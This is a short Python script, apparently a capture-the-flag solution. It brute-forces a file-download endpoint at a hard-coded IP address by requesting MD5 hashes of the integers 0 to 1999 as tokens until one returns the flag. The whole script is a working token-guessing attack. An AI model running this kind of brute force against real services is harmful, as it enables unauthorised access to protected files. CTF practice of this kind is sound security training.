# -*- coding: utf-8 -*-
# @Author: logan47
# @Date:   2019-09-07 21:48:50
# @Last Modified by:   logan47
# @Last Modified time: 2019-09-07 22:20:47
import wget
import hashlib
import os
url = "http://165.22.22.11:25632/download.php?file=flag.txt&token="

for i in range(2000):
	token = hashlib.md5(str(i).encode()).hexdigest()
	wget.download(url+token, 'flag.txt')
	with open('flag.txt', 'r') as fp:
		r = fp.read()
		print(i)
		if r != "Invalid token.":
			print(i,token)
			print(r)
			break
		else:
			print("file removed")
			os.remove('flag.txt')


